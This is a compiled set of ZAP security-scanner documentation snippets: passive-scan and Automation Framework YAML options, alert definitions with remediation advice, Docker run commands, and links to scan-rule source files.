TITLE: Configuring Passive Scanner Options in ZAP
DESCRIPTION: This markdown table lists configuration options for the passive scanner in ZAP. It includes fields for scope limitations, Fuzzer traffic inclusion, alert limits, and body size restrictions. Each option is described with its default value and corresponding config file key.

LANGUAGE: markdown
CODE:
|                         Field                         |                                                                                                                                                                                 Details                                                                                                                                                                                  |  Default   |                                      Config File                                      |
|-------------------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|------------|---------------------------------------------------------------------------------------|
| Only scan messages in scope                           | Sets whether or not the passive scan should be performed only on messages that are [in scope](/docs/desktop/start/features/scope/).                                                                                                                                                                                                                                      | Deselected | Key: `pscans.scanOnlyInScope` Values: `true` or `false`                               |
| Include traffic from the Fuzzer when passive scanning | Sets whether or not the passive scanning should be performed on messages generated by the Fuzzer.                                                                                                                                                                                                                                                                        | Deselected | Key: `pscans.scanFuzzerMessages` Values: `true` or `false`                            |
| Max alerts any rule can raise                         | Sets the maximum number of alerts a passive scan rule should raise. This may be slightly exceeded due to threading. This setting is typically only useful for automated scanning. Scan rules that exceed this value will be disabled and will need to be manually enabled if a new session is started.                                                                   | 0 (unset)  | Key: `pscans.maxAlertsPerRule` Values: `0`: unset or the maximum number of alerts     |
| Max body size in bytes to scan                        | Sets the maximum size request or response body size in bytes that the passive scanner will scan. This can be used if passive scan rules take too long scanning very large requests or responses. If set the number of ignored requests and responses are recorded in the stats using the keys `stats.pscan.reqBodyTooBig` and `stats.pscan.respBodyTooBig` respectively. | 0 (unset)  | Key: `pscans.maxBodySizeInBytes` Values: `0`: unset or the maximum body size in bytes |
| Clear Queue                                           | Empties the passive scan queue without passively scanning the messages. Currently running rules will run to completion but new rules will only be run when new messages are added to the queue.                                                                                                                                                                          |            |                                                                                       |

----------------------------------------

TITLE: Detecting Debug Error Messages in WebSocket Responses using JavaScript
DESCRIPTION: This script template is used for passively scanning WebSocket messages to identify common debug error messages. It helps detect potential information disclosure vulnerabilities in WebSocket communications.

LANGUAGE: JavaScript
CODE:
// The code for this script is located at:
// https://github.com/zaproxy/zap-extensions/blob/main/addOns/websocket/src/main/zapHomeFiles/scripts/templates/websocketpassive/Debug%20Error%20Disclosure.js

----------------------------------------

TITLE: Alert Configuration for Server Header Information Leak
DESCRIPTION: YAML configuration for defining the security alert parameters related to server information disclosure through HTTP headers. Includes alert ID, risk level, solution recommendations, and relevant security standards references.

LANGUAGE: yaml
CODE:
title: "Server Leaks its Webserver Application via \"Server\" HTTP Response Header Field"
alertid: 10036-1
alertindex: 1003601
alerttype: "Passive"
alertcount: 2
status: release
type: alert
risk: Informational
solution: "Ensure that your web server, application server, load balancer, etc. is configured to suppress the \"Server\" header or provide generic details."
references:
   - https://httpd.apache.org/docs/current/mod/core.html#servertokens
   - https://learn.microsoft.com/en-us/previous-versions/msp-n-p/ff648552(v=pandp.10)
   - https://www.troyhunt.com/shhh-dont-let-your-response-headers/
other: ""
cwe: 497
wasc: 13
alerttags: 
  - CWE-497
  - OWASP_2017_A06
  - OWASP_2021_A05
  - WSTG-v42-INFO-02

----------------------------------------

TITLE: Buffer Overflow Alert Configuration in YAML
DESCRIPTION: YAML configuration defining the properties of the buffer overflow security alert including ID, risk level, solutions, and related security standards references.

LANGUAGE: yaml
CODE:
title: "Buffer Overflow"
alertid: 30001
alertindex: 3000100
alerttype: "Active"
alertcount: 1
status: release
type: alert
risk: Medium
solution: "Rewrite the background program using proper return length checking. This will require a recompile of the background executable."
references:
   - https://owasp.org/www-community/attacks/Buffer_overflow_attack
other: "Potential Buffer Overflow. The script closed the connection and threw a 500 Internal Server Error."
cwe: 120
wasc: 7
techtags: 
  - Language.C
alerttags: 
  - CWE-120
  - OWASP_2017_A01
  - OWASP_2021_A03
  - POLICY_API

----------------------------------------

TITLE: Configuring OpenAPI Job in ZAP Automation Framework
DESCRIPTION: This YAML configuration snippet defines the 'openapi' job for importing OpenAPI definitions in ZAP's Automation Framework. It specifies parameters for API file location, URL, context, user authentication, and target URL override.

LANGUAGE: yaml
CODE:
  - type: openapi                      # OpenAPI definition import
    parameters:
      apiFile:                         # String: Local file containing the OpenAPI definition, default: null, no definition will be imported
      apiUrl:                          # String: URL containing the OpenAPI definition, default: null, no definition will be imported
      context:                         # String: Context to use when importing the OpenAPI definition, default: first context.
      user:                            # String: An optional user to use for authentication, must be defined in the env.
      targetUrl:                       # String: URL which overrides the target defined in the definition, default: null, the target will not be overridden

----------------------------------------

TITLE: Configuring passiveScan-config Job in YAML for ZAP Automation Framework
DESCRIPTION: This YAML snippet demonstrates how to configure the passiveScan-config job in ZAP's Automation Framework. It includes options for setting maximum alerts per rule, scanning scope, body size limits, and enabling tags. It also allows for individual rule configuration.

LANGUAGE: yaml
CODE:
  - type: passiveScan-config           # Passive scan configuration
    parameters:
      maxAlertsPerRule: 10             # Int: Maximum number of alerts to raise per rule
      scanOnlyInScope: true            # Bool: Only scan URLs in scope (recommended)
      maxBodySizeInBytesToScan:        # Int: Maximum body size to scan, default: 0 - will scan all messages
      enableTags: false                # Bool: Enable passive scan tags, default: false - enabling them can impact performance
      disableAllRules: false           # Bool: If true then will disable all rules before applying the settings in the rules section
    rules:                             # A list of one or more passive scan rules and associated settings which override the defaults
    - id:                              # Int: The rule id as per https://www.zaproxy.org/docs/alerts/
      name:                            # String: The name of the rule for documentation purposes - this is not required or actually used
      threshold:                       # String: The Alert Threshold for this rule, one of Off, Low, Medium, High, default: Medium

----------------------------------------

TITLE: Running ZAP with Webswing using Docker (Stable Version)
DESCRIPTION: This command runs the stable version of ZAP with Webswing support using Docker. It maps ports 8080 and 8090, and uses the 'zap' user.

LANGUAGE: bash
CODE:
docker run -u zap -p 8080:8080 -p 8090:8090 -i ghcr.io/zaproxy/zaproxy:stable zap-webswing.sh

----------------------------------------

TITLE: Exporting Data in ZAP Automation Framework
DESCRIPTION: Job configuration for exporting data in HAR, URL, or YAML formats. Supports exporting from different sources including all messages, history, or sites tree with configurable context.

LANGUAGE: yaml
CODE:
  - type: export            # Exports data into a file
      parameters:
        context:            # String: Name of the context from which to export. Default: first context
        type:               # String: One of 'har', 'url', 'yaml'. Default: 'har'
        source:             # String: One of 'history', 'sitestree', 'all'. Default: 'history'
        fileName:           # String: Name/path to the file

----------------------------------------

TITLE: Configuring Passive Scan Tag with Regex Interpolation in ZAP
DESCRIPTION: This example demonstrates how to set up a passive scan tag in ZAP using regex interpolation. It shows how to configure a tag named 'Test' that matches 3-digit numbers in the response body and creates tags like '123-SOMETAG'.

LANGUAGE: markdown
CODE:
|        Field         |   Value    |                                 Note                                 |
|----------------------|------------|----------------------------------------------------------------------|
| Name:                | Test       |                                                                      |
| Tag:                 | $1-SOMETAG |                                                                      |
| Response Body Regex: | (\\d{3})   | Find strings of 3 numbers, using a capturing group (round brackets). |

----------------------------------------

TITLE: WebSocket PII Detection Script - JavaScript
DESCRIPTION: A passive scanning script that monitors WebSocket traffic for potential exposure of Personally Identifiable Information (PII) such as credit card numbers. The script generates high-risk alerts when PII is detected in responses.

LANGUAGE: javascript
CODE:
// Referenced external code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/websocket/src/main/zapHomeFiles/scripts/templates/websocketpassive/PII%20Disclosure.js

----------------------------------------

TITLE: Invalid Cookie SameSite Attribute Alert Definition
DESCRIPTION: YAML configuration for a security alert that identifies cookies with invalid SameSite attributes. Includes risk level, solution guidance, and references to security standards like CWE and WASC.

LANGUAGE: yaml
CODE:
title: "Cookie with Invalid SameSite Attribute"
alertid: 10054-3
alertindex: 1005403
alerttype: "Passive"
alertcount: 3
status: release
type: alert
risk: Low
solution: "Ensure that the SameSite attribute is set to either 'lax' or ideally 'strict' for all cookies."
references:
   - https://tools.ietf.org/html/draft-ietf-httpbis-cookie-same-site
other: ""
cwe: 1275
wasc: 13
alerttags: 
  - CWE-1275
  - OWASP_2017_A05
  - OWASP_2021_A01
  - WSTG-v42-SESS-02

----------------------------------------

TITLE: Importing Postman Collection via Command Line in ZAProxy
DESCRIPTION: Command-line options added for importing Postman collections. Options include specifying a file, URL, and endpoint URL for the import.

LANGUAGE: markdown
CODE:
* -postmanfile <filename> : Imports a Postman collection from the specified file name
* -postmanurl <url> : Imports a Postman collection from the specified URL
* -postmanendpointurl <url> : The endpoint URL, to override the base URLs present in the Postman collection

----------------------------------------

TITLE: Detecting Private IP Disclosure in WebSocket Messages using JavaScript
DESCRIPTION: This script template is used for passive scanning of WebSocket messages to detect private IP addresses or Amazon EC2 private hostnames. It helps identify potential information leakage that could be useful for targeting internal systems.

LANGUAGE: javascript
CODE:
// The script is referenced but not provided in the input text.
// Link to the actual script: https://github.com/zaproxy/zap-extensions/blob/main/addOns/websocket/src/main/zapHomeFiles/scripts/templates/websocketpassive/Private%20IP%20Disclosure.js

----------------------------------------

TITLE: Defining Markdown Frontmatter for ZAP Documentation
DESCRIPTION: Sets up the frontmatter for a ZAP documentation page, specifying the title, content type, and weight for ordering.

LANGUAGE: markdown
CODE:
---
# This page was generated from the add-on.
title: Retest - About
type: userguide
weight: 1
---

----------------------------------------

TITLE: YAML Alert Configuration for Format String Error
DESCRIPTION: YAML configuration defining metadata for the Format String Error security alert in ZAP, including alert ID, risk level, solution guidance, and related security classifications.

LANGUAGE: yaml
CODE:
title: "Format String Error"
alertid: 30002
alertindex: 3000200
alerttype: "Active"
alertcount: 1
status: release
type: alert
risk: Medium
solution: "Rewrite the background program using proper deletion of bad character strings. This will require a recompile of the background executable."
references:
   - https://owasp.org/www-community/attacks/Format_string_attack
other: "Potential Format String Error. The script closed the connection on a /%s."
cwe: 134
wasc: 6
techtags: 
  - Language.C
alerttags: 
  - CWE-134
  - OWASP_2017_A01
  - OWASP_2021_A03
  - POLICY_API
  - POLICY_QA_FULL

----------------------------------------

TITLE: Configuring ZAP Passive Scanner in YAML
DESCRIPTION: YAML configuration for the ZAP passive scanner automation job. Allows setting maximum alerts per rule, scope restrictions, body size limits, and individual rule configurations. The configuration is applied before other jobs run and can be reset when the plan ends.

LANGUAGE: yaml
CODE:
  - type: passiveScan-config           # Passive scan configuration
    parameters:
      maxAlertsPerRule: 10             # Int: Maximum number of alerts to raise per rule
      scanOnlyInScope: true            # Bool: Only scan URLs in scope (recommended)
      maxBodySizeInBytesToScan:        # Int: Maximum body size to scan, default: 0 - will scan all messages
      enableTags: false                # Bool: Enable passive scan tags, default: false - enabling them can impact performance
      disableAllRules: false           # Bool: If true then will disable all rules before applying the settings in the rules section
    rules:                             # A list of one or more passive scan rules and associated settings which override the defaults
    - id:                              # Int: The rule id as per https://www.zaproxy.org/docs/alerts/
      name:                            # String: The name of the rule for documentation purposes - this is not required or actually used
      threshold:                       # String: The Alert Threshold for this rule, one of Off, Low, Medium, High, default: Medium

----------------------------------------

TITLE: Implementing getMetadata Function for ZAP Script Scan Rule
DESCRIPTION: This snippet demonstrates how to implement the getMetadata function in a ZAP script to expose it as a scan rule. It uses YAML to define metadata such as id, name, description, and risk level.

LANGUAGE: javascript
CODE:
const ScanRuleMetadata = Java.type("org.zaproxy.addon.commonlib.scanrules.ScanRuleMetadata");

function getMetadata() {
	return ScanRuleMetadata.fromYaml(`
id: 12345
name: Passive Vulnerability Title
description: Full description
solution: The solution
references:
  - https://example.org/reference-1
  - https://example.org/reference-2
risk: INFO  # info, low, medium, high
confidence: LOW  # false_positive, low, medium, high, user_confirmed
cweId: 0
wascId: 0
alertTags:
  name1: value1
  name2: value2
otherInfo: Any other info
status: alpha
`);
}

----------------------------------------

TITLE: Mounting Current Directory for ZAP Docker
DESCRIPTION: Examples of how to mount the current working directory when running ZAP Docker containers on different operating systems and shells.

LANGUAGE: bash
CODE:
# ...linux / MacOS / PowerShell
docker run -v $(pwd):/zap/wrk/:rw -t zaproxy/zap-stable zap.sh ...

# ...linux / MacOS / PowerShell
docker run -v ${PWD}:/zap/wrk/:rw -t zaproxy/zap-stable zap.sh ...

# ...windows CMD
docker run -v %cd%:/zap/wrk/:rw -t zaproxy/zap-stable zap.sh ...

----------------------------------------

TITLE: Detecting Username Hashes in WebSocket Messages - JavaScript
DESCRIPTION: A WebSocket passive scanner script that searches for username hashes in WebSocket messages to identify potential IDOR vulnerabilities. The script looks for patterns like '{Example / context: Example}' which may indicate insecure direct object references that could be exploited.

LANGUAGE: javascript
CODE:
// Referenced but not shown in text: scripts/templates/websocketpassive/Username Idor Scanner.js

----------------------------------------

TITLE: Configuring Email Address Detection Alert in ZAP for WebSocket Messages
DESCRIPTION: This code snippet defines the configuration for an alert in ZAP that detects email addresses in WebSocket messages. It specifies the alert ID, type, risk level, and provides a solution to mitigate the issue.

LANGUAGE: yaml
CODE:
title: "Email address found in WebSocket message"
alertid: 110004
alertindex: 11000400
alerttype: "WebSocket Passive"
alertcount: 1
status: release
type: alert
risk: Informational
solution: "Remove emails that are not public."
other: ""
cwe: 200
wasc: 13
alerttags: 
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/websocket/src/main/zapHomeFiles/scripts/templates/websocketpassive/Email%20Disclosure.js
linktext: "scripts/templates/websocketpassive/Email Disclosure.js"

----------------------------------------

TITLE: Configuring passiveScan-wait Job in YAML
DESCRIPTION: YAML configuration for the passive scan wait job that allows setting the maximum duration to wait for passive scanner completion. The maxDuration parameter is optional with a default of unlimited (0).

LANGUAGE: yaml
CODE:
  - type: passiveScan-wait             # Passive scan wait for the passive scanner to finish
    parameters:
      maxDuration: 5                   # Int: The max time in minutes to wait for the passive scanner, default: 0 unlimited

----------------------------------------

TITLE: Defining Markdown Frontmatter for ZAP Documentation
DESCRIPTION: This code snippet defines the frontmatter for a ZAP documentation page, specifying metadata such as title, type, weight, and add-on information.

LANGUAGE: markdown
CODE:
---
# This page was generated from the add-on.
title: Technology Detection
type: userguide
weight: 1
cascade:
  addon:
    id: wappalyzer
    version: 21.45.0
---

----------------------------------------

TITLE: Detecting Suspicious Comments in HTML
DESCRIPTION: This HTML snippet demonstrates a suspicious comment that triggers the 'Information Disclosure - Suspicious Comments' alert in OWASP ZAP. The comment contains a 'FIXME' tag which could potentially reveal sensitive information or implementation details to attackers.

LANGUAGE: html
CODE:
<!-- FixMe: cookie: root=true; Secure -->

----------------------------------------

TITLE: YAML Configuration for XSS JavaScript Event Scanner
DESCRIPTION: YAML configuration block defining the scanner properties including alert ID, risk level, solution guidance, and related security references. Includes CWE/WASC classifications and OWASP Top 10 mappings.

LANGUAGE: yaml
CODE:
title: "User Controllable JavaScript Event (XSS)"
alertid: 10043
alertindex: 1004300
alerttype: "Passive"
alertcount: 1
status: release
type: alert
risk: Informational
solution: "Validate all input and sanitize output it before writing to any Javascript on* events."
references:
   - https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html
other: "User-controlled javascript event(s) was found. Exploitability will need to be manually determined. The page at the following URL:  http://example.com/i.php?place=moon&name=Foo  includes the following Javascript event which may be attacker-controllable:  User-input was found in the following data of an [onerror] event: foo  The user input was: foo"
cwe: 20
wasc: 20
alerttags: 
  - CWE-20
  - OWASP_2017_A01
  - OWASP_2021_A03

----------------------------------------

TITLE: Referencing Integer Overflow Scan Rule in Java
DESCRIPTION: This code snippet shows the file path for the Java class implementing the Integer Overflow scan rule in ZAP. It's part of the Beta active scan rules.

LANGUAGE: Java
CODE:
org/zaproxy/zap/extension/ascanrulesBeta/IntegerOverflowScanRule.java

----------------------------------------

TITLE: Configuring Spider Job in ZAP Automation Framework
DESCRIPTION: YAML configuration for the Spider job in ZAP's Automation Framework. Includes all available parameters for customizing the spider behavior including context, user authentication, URL settings, duration limits, parsing options, and test configurations for validating spider results.

LANGUAGE: yaml
CODE:
  - type: spider                       # The traditional spider - fast but doesnt handle modern apps so well
    parameters:
      context:                         # String: Name of the context to spider, default: first context
      user:                            # String: An optional user to use for authentication, must be defined in the env
      url:                             # String: Url to start spidering from, default: first context URL
      maxDuration:                     # Int: The max time in minutes the spider will be allowed to run for, default: 0 unlimited
      maxDepth:                        # Int: The maximum tree depth to explore, default 5
      maxChildren:                     # Int: The maximum number of children to add to each node in the tree
      acceptCookies:                   # Bool: Whether the spider will accept cookies, default: true
      handleODataParametersVisited:    # Bool: Whether the spider will handle OData responses, default: false
      handleParameters:                # Enum [ignore_completely, ignore_value, use_all]: How query string parameters are used when checking if a URI has already been visited, default: use_all
      maxParseSizeBytes:               # Int: The max size of a response that will be parsed, default: 2621440 - 2.5 Mb
      parseComments:                   # Bool: Whether the spider will parse HTML comments in order to find URLs, default: true
      parseGit:                        # Bool: Whether the spider will parse Git metadata in order to find URLs, default: false
      parseDsStore:                    # Bool: Whether the spider will parse .DS_Store files in order to find URLs, default: false
      parseRobotsTxt:                  # Bool: Whether the spider will parse 'robots.txt' files in order to find URLs, default: true
      parseSitemapXml:                 # Bool: Whether the spider will parse 'sitemap.xml' files in order to find URLs, default: true
      parseSVNEntries:                 # Bool: Whether the spider will parse SVN metadata in order to find URLs, default: false
      postForm:                        # Bool: Whether the spider will submit POST forms, default: true
      processForm:                     # Bool: Whether the spider will process forms, default: true
      sendRefererHeader:               # Bool: Whether the spider will send the referer header, default: true
      threadCount:                     # Int: The number of spider threads, default: 2 * Number of available processor cores
      userAgent:                       # String: The user agent to use in requests, default: '' - use the default ZAP one 
    tests:
      - name: 'At least 100 URLs found'                 # String: Name of the test, default: statistic + operator + value
        type: 'stats'                                   # String: Type of test, only 'stats' is supported for now
        statistic: 'automation.spider.urls.added'       # String: Name of an integer / long statistic, currently supported: 'automation.spider.urls.added'
        operator: '>='                                  # String ['==', '!=', '>=', '>', '<', '<=']: Operator used for testing
        value: 100                                      # Int: Change this to the number of URLs you expect to find
        onFail: 'info'                                  # String: One of 'warn', 'error', 'info', mandatory

----------------------------------------

TITLE: OAST API Actions
DESCRIPTION: Modifiable API endpoints for configuring OAST services and settings, including parameters for each operation

LANGUAGE: markdown
CODE:
* setActiveScanService (name*): Sets the service used with the active scanner.
    * name: The name of the service.
* setBoastOptions (server* pollInSecs*): Sets the BOAST options.
    * server: The server URL.
    * pollInSecs: The polling frequency.
* setCallbackOptions (localAddress* remoteAddress* port*): Sets the Callback options.
    * localAddress: The local address
    * remoteAddress: The remote address.
    * port: The port to listen on.
* setDaysToKeepRecords (days*): Sets the number of days the OAST records will be kept for.
    * days: The number of days.
* setInteractshOptions (server* pollInSecs* authToken*): Sets the Interactsh options.
    * server: The server URL.
    * pollInSecs: The polling frequency.
    * authToken: The Interactsh authentication token.

----------------------------------------

TITLE: ZAP Script Execution Example
DESCRIPTION: Running a script against an existing session in command line mode

LANGUAGE: shell
CODE:
<zap-script> -session /full/path/to/existing/session -script /full/path/to/script.js -cmd

----------------------------------------

TITLE: ZAP Script Execution Example
DESCRIPTION: Running a script against an existing session in command line mode

LANGUAGE: shell
CODE:
<zap-script> -session /full/path/to/existing/session -script /full/path/to/script.js -cmd

----------------------------------------

TITLE: Implementing Path Traversal Scan Rule in Java
DESCRIPTION: This code snippet refers to the implementation of a Path Traversal scan rule in ZAP (Zed Attack Proxy). It is part of the active scan rules and is used to detect Path Traversal vulnerabilities in web applications.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrules/src/main/java/org/zaproxy/zap/extension/ascanrules/PathTraversalScanRule.java

----------------------------------------

TITLE: Starting ZAP behind NAT with API Access
DESCRIPTION: Command to start ZAP in daemon mode with NAT configuration enabled for API access through public IP address.

LANGUAGE: bash
CODE:
zap.sh -daemon -port 8080 -host 0.0.0.0 -config network.localServers.mainProxy.behindNat=true

----------------------------------------

TITLE: Scanning ASP.NET Viewstate for IP Addresses in Java
DESCRIPTION: A passive scanning rule implemented in Java that detects serialized IP addresses within ASP.NET viewstate fields. This scanner helps identify potential information disclosure vulnerabilities with a medium risk rating and maps to CWE-642 and WASC-14.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/ViewstateScanRule.java

----------------------------------------

TITLE: MongoDB Time-Based Injection Scanner in Java
DESCRIPTION: Specialized scanner for detecting MongoDB NoSQL injection vulnerabilities using time-based attack techniques.

LANGUAGE: Java
CODE:
MongoDbInjectionTimingScanRule.java

----------------------------------------

TITLE: Defining Expression Language Injection Alert in ZAP
DESCRIPTION: This markdown snippet defines the metadata and details for the Expression Language Injection vulnerability alert in OWASP ZAP. It includes the alert ID, risk level, solution, references, and associated tags.

LANGUAGE: markdown
CODE:
---
title: "Expression Language Injection"
alertid: 90025
alertindex: 9002500
alerttype: "Active"
alertcount: 1
status: beta
type: alert
risk: High
solution: "Perform data validation best practice against untrusted input and to ensure that output encoding is applied when data arrives on the EL layer, so that no metacharacter is found by the interpreter within the user content before evaluation. The most obvious patterns to detect include ${ and #{, but it may be possible to encode or fragment this data."
references:
   - https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection
   - https://cwe.mitre.org/data/definitions/917.html
other: ""
cwe: 917
wasc: 20
alerttags: 
  - CWE-917
  - OWASP_2017_A01
  - OWASP_2021_A03
  - POLICY_API
  - POLICY_QA_FULL
  - POLICY_QA_STD
  - WSTG-v42-INPV-11
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrulesBeta/src/main/java/org/zaproxy/zap/extension/ascanrulesBeta/ExpressionLanguageInjectionScanRule.java
linktext: "org/zaproxy/zap/extension/ascanrulesBeta/ExpressionLanguageInjectionScanRule.java"
help: https://www.zaproxy.org/docs/desktop/addons/active-scan-rules-beta/#id-90025
---

----------------------------------------

TITLE: Automation Framework Indicator Output
DESCRIPTION: Example output line indicating that the Automation Framework is being used in the baseline scan.

LANGUAGE: bash
CODE:
Using the Automation Framework

----------------------------------------

TITLE: Alert Configuration for Site Isolation Scan Rule
DESCRIPTION: YAML configuration for a security alert that identifies insufficient site isolation protections. Defines alert metadata, risk level, solution guidance, and related security standards references.

LANGUAGE: yaml
CODE:
title: "Insufficient Site Isolation Against Spectre Vulnerability"
alertid: 90004-3
alertindex: 9000403
alerttype: "Passive"
alertcount: 3
status: beta
type: alert
risk: Low
solution: "Ensure that the application/web server sets the Cross-Origin-Opener-Policy header appropriately, and that it sets the Cross-Origin-Opener-Policy header to 'same-origin' for documents. 'same-origin-allow-popups' is considered as less secured and should be avoided. If possible, ensure that the end user uses a standards-compliant and modern web browser that supports the Cross-Origin-Opener-Policy header (https://caniuse.com/mdn-http_headers_cross-origin-opener-policy)."
references:
   - https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cross-Origin-Opener-Policy
other: ""
cwe: 693
wasc: 14
alerttags: 
  - CWE-693
  - OWASP_2017_A03
  - OWASP_2021_A04

----------------------------------------

TITLE: Defining Session ID in URL Rewrite Alerts in YAML
DESCRIPTION: This YAML configuration defines three related alerts for detecting Session ID exposure. It includes alert IDs, names, and metadata for the alertset.

LANGUAGE: yaml
CODE:
title: "Session ID in URL Rewrite"
alertid: 3
alertindex: 300
alerttype: "Passive"
status: release
type: alertset
alerts:
   3-1:
      alertid: 3-1
      name: "Session ID in URL Rewrite"
   3-2:
      alertid: 3-2
      name: "Session ID in URL Rewrite"
   3-3:
      alertid: 3-3
      name: "Referer Exposes Session ID"
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/InfoSessionIdUrlScanRule.java
linktext: "org/zaproxy/zap/extension/pscanrules/InfoSessionIdUrlScanRule.java"

----------------------------------------

TITLE: Configuring Statistics Job Test in YAML for ZAP Automation Framework
DESCRIPTION: This YAML configuration demonstrates how to set up a statistics-based test within a job in the ZAP Automation Framework. It includes parameters for specifying the test name, statistic to be tested, site (if applicable), comparison operator, test value, and failure action.

LANGUAGE: yaml
CODE:
  jobs:
  - type: example
    parameters:
      jobSpecificParam: 'value'
    tests:
      - name: 'test one'                      # Name of the test, optional
        type: stats                           # Specifies that the test is of type 'stats'
        statistic: 'stats.addon.something'    # Name of an integer / long statistic
        site:                                 # Name of the site for site specific tests, supports vars
        operator: '>='                        # One of '==', '!=', '>=', '>', '<', '<='
        value: 10                             # Value to compare statistic against
        onFail: 'info'                        # String: One of 'warn', 'error', 'info', mandatory

----------------------------------------

TITLE: YAML Frontmatter for ZAP Connection Documentation
DESCRIPTION: YAML frontmatter defining metadata for the ZAP connection configuration documentation page, including title, type, and weight.

LANGUAGE: yaml
CODE:
---
# This page was generated from the add-on.
title: Connection
type: userguide
weight: 2
---

----------------------------------------

TITLE: Rendering Bar Chart for ZAP Docker Image Pulls in Markdown
DESCRIPTION: This snippet renders a bar chart showing Docker image pull statistics for ZAP. It includes a note about changes in Docker image management and statistics collection.

LANGUAGE: markdown
CODE:
{{< chart name="docker" stacked="true">}}

In April 2024 we removed the OWASP images, created a new zaproxy DockerHub org, 
deprecated the SSP docker images, and started collecting stats for the GHCR image.

----------------------------------------

TITLE: Scanning for Malformed Strict-Transport-Security Headers in Java
DESCRIPTION: This code snippet is part of a passive scan rule in ZAP that checks for malformed Strict-Transport-Security headers. It likely contains logic to parse and validate the header content against the expected ASCII printable characters as per the specification.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/StrictTransportSecurityScanRule.java

----------------------------------------

TITLE: Configuring Non-Static Site Detection Alert in ZAP
DESCRIPTION: YAML configuration for ZAP alert that detects non-static websites. Defines alert properties including ID, type, risk level, and solution guidance.

LANGUAGE: yaml
CODE:
title: "Non Static Site Detected"
alertid: 100017
alertindex: 10001700
alerttype: "Script Passive"
alertcount: 1
status: alpha
type: alert
risk: Informational
solution: "If this is not a static site then ignore or disable this rule. "
other: ""
alerttags: 
code: https://github.com/zaproxy/community-scripts/blob/main/passive/Report%20non%20static%20sites.js
linktext: "passive/Report non static sites.js"
help: https://www.zaproxy.org/docs/desktop/addons/community-scripts/

----------------------------------------

TITLE: Single Page Application URL Structure Example
DESCRIPTION: Example URLs showing how single page applications use parameters to indicate logical pages

LANGUAGE: url
CODE:
https://www.example.com/app/aaa?page=p1&ddd=eee
https://www.example.com/app/aaa?page=p2&ddd=fff
https://www.example.com/app/aaa?page=p3&ddd=ggg

----------------------------------------

TITLE: Creating Markdown Table for Network Add-on Related Links
DESCRIPTION: This code snippet creates a markdown table that provides links to related Network Add-on documentation, including the Network API, Command Line arguments, and Options screens.

LANGUAGE: markdown
CODE:
|   |                                                       |                                          |
|---|-------------------------------------------------------|------------------------------------------|
|   | [Network API](/docs/desktop/addons/network/api/)      | for more details about the Network API   |
|   | [Command Line](/docs/desktop/addons/network/cmdline/) | for the supported command line arguments |
|   | [Options](/docs/desktop/addons/network/options/)      | for the provided options screens         |

----------------------------------------

TITLE: Detecting Mixed Content in Java for ZAP Extension
DESCRIPTION: This code snippet is part of the MixedContentScanRule class in ZAP, which detects mixed content (HTTP resources on HTTPS pages) during passive scanning. It's implemented in Java and is located in the pscanrules add-on.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/MixedContentScanRule.java

----------------------------------------

TITLE: Implementing Storable but Non-Cacheable Content Detection in Java for ZAProxy
DESCRIPTION: This code snippet is part of ZAProxy's passive scan rules. It implements the detection of content that can be stored by caching components but requires validation before retrieval from cache for subsequent similar requests.

LANGUAGE: java
CODE:
https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrulesBeta/src/main/java/org/zaproxy/zap/extension/pscanrulesBeta/CacheableScanRule.java

----------------------------------------

TITLE: YAML Alert Configuration for LDAP Injection
DESCRIPTION: YAML configuration block defining properties of the LDAP Injection security alert including risk level, solution guidance, and reference links. Includes technical metadata like CWE/WASC identifiers and OWASP categorization.

LANGUAGE: yaml
CODE:
title: "LDAP Injection"
alertid: 40015
alertindex: 4001500
alerttype: "Active"
alertcount: 1
status: alpha
type: alert
risk: High
solution: "Validate and/or escape all user input before using it to create an LDAP query.  In particular, the following characters (or combinations) should be deny listed: & | ! < > = ~= >= <= * ( ) , + - \" ' ; \\ / NUL character "
references:
   - https://owasp.org/www-community/attacks/LDAP_Injection
   - https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html
other: ""
cwe: 90
wasc: 29
techtags: 
  - Protocol.LDAP
alerttags: 
  - OWASP_2017_A01
  - OWASP_2021_A03
  - WSTG-v42-INPV-06
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/ascanrulesAlpha/src/main/java/org/zaproxy/zap/extension/ascanrulesAlpha/LdapInjectionScanRule.java
linktext: "org/zaproxy/zap/extension/ascanrulesAlpha/LdapInjectionScanRule.java"
help: https://www.zaproxy.org/docs/desktop/addons/active-scan-rules-alpha/#id-40015

----------------------------------------

TITLE: Referer Session ID Alert Configuration in YAML
DESCRIPTION: YAML configuration for a passive scan alert rule that detects session ID exposure through referer headers. Defines alert metadata, risk level, solution guidance, and related security standards references.

LANGUAGE: yaml
CODE:
title: "Referer Exposes Session ID"
alertid: 3-3
alertindex: 303
alerttype: "Passive"
alertcount: 3
status: release
type: alert
risk: Medium
solution: "This is a risk if the session ID is sensitive and the hyperlink refers to an external or third party host. For secure content, put session ID in secured session cookie."
references:
   - https://seclists.org/webappsec/2002/q4/111
other: ""
cwe: 598
wasc: 13
alerttags: 
  - CWE-598
  - OWASP_2017_A03
  - OWASP_2021_A01
  - WSTG-v42-SESS-04

----------------------------------------

TITLE: Adding and Running Inline Script in YAML for ZAP Automation Framework
DESCRIPTION: This YAML example demonstrates how to add and run a simple standalone inline script in the ZAP Automation Framework. It first adds a script with a multi-line content, then runs it using separate job configurations.

LANGUAGE: yaml
CODE:
  - type: script
      parameters:
        action: "add"
        type: "standalone"
        engine: "ECMAScript : Graal.js"
